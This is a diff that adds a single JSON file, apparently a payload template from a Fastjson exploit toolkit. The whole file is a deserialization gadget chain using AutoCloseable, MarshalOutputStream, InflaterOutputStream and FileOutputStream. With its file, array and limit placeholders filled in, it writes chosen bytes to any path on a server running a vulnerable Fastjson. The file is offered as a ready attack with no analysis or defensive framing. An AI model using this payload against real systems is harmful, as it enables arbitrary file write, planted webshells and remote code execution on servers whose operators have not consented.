@@ -1,0 +1,20 @@
+{
+  "@type": "java.lang.AutoCloseable",
+  "@type": "sun.rmi.server.MarshalOutputStream",
+  "out": {
+    "@type": "java.util.zip.InflaterOutputStream",
+    "out": {
+      "@type": "java.io.FileOutputStream",
+      "file": "${file}",
+      "append": false
+    },
+    "infl": {
+      "input": {
+        "array": "${array}",
+        "limit": ${limit}
+      }
+    },
+    "bufLen": "100"
+  },
+  "protocolVersion": 1
+}
